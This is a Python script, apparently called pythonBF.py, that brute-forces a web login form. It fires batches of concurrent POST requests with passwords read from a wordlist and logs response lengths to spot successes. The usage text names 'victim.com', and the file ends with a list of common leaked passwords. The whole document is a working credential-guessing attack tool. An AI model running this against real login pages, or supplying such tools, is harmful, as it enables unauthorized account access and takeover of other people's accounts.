import time
import aiohttp
import asyncio
import sys


async def wrg_pass(session):
    login_data[f'{sys.argv[4]}'] = "admin"
    login_data[f'{sys.argv[5]}'] = "admin"

    async with session.post(url, data=login_data) as resp:
        # print("Wrong pass request", len(str(resp)))
        login_data[f'{sys.argv[4]}'] = sys.argv[2]
        # return len(str(resp))
    async with session.post(url, data=login_data) as resp:
        print("Wrong pass request", len(str(resp)))
        # login_data[f'{sys.argv[4]}'] = sys.argv[2]
        return len(str(resp))


async def send_request(session, password, __wrg_pass):
    login_data[f'{sys.argv[5]}'] = password

    async with session.post(url, data=login_data) as resp:
        print(f"Request send to {url}, login: {login_data[f'{sys.argv[4]}']},"
              f" password: {password}. Response length: {len(str(resp))}")
        # if len(str(resp)) != __wrg_pass:
            # sys.exit(f"Found one, {login_data[f'{sys.argv[4]}']} {password}")


async def period(session, point, __wrg_pass):
    print("START OF PERIOD")
    tasks = []
    temp_pass = []
    pointer = open(f"{path_to_wordlist}")
    m = 0

    for i in pointer:
        m += 1
        if point <= m and m < (point + 50):
            temp_pass.append(i)
        elif m == (point + 50):
            break
    for i in temp_pass:
        tasks.append(asyncio.ensure_future(send_request(session, i.rstrip(), __wrg_pass)))
    await asyncio.gather(*tasks)
    print("END OF PERIOD")


async def main():
    async with aiohttp.ClientSession() as session:
        _wrg_pass = await wrg_pass(session)
        for _ in range(30):
            await period(session, _ * 50, _wrg_pass)


if __name__ == "__main__":
    if len(sys.argv) == 6:
        try:
            args = sys.argv
            login_data = {}
            url = f"{sys.argv[1]}"
            login_data[f'{sys.argv[4]}'] = sys.argv[2]
            login_data[f'{sys.argv[5]}'] = "pwd_field"
            path_to_wordlist = f"{sys.argv[3]}"

            start_time = time.perf_counter()
            asyncio.run(main())
            print(f"Time {(time.perf_counter() - start_time)}")

        except:
            e = sys.exc_info()
            print(e[0])
            print(e[1])

            print("Error, something went wrong, check if server is up and nothing is blocking you connection!")
    else:
        print("Usage: python3 pythonBF.py 'http://victim.com/' 'username' "
              "'/path/to/wordlist.txt' 'username field name' 'password field name'")


"""123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
nicole
daniel
babygirl
monkey
lovely
jessica
654321
michael
ashley
qwerty
111111
iloveu
000000
michelle
tigger
sunshine
chocolate
password1
soccer
anthony
friends
butterfly
purple
angel
jordan
liverpool
justin
loveme
fuckyou
123123
football
secret
andrea
carlos
jennifer
joshua
bubbles
1234567890"""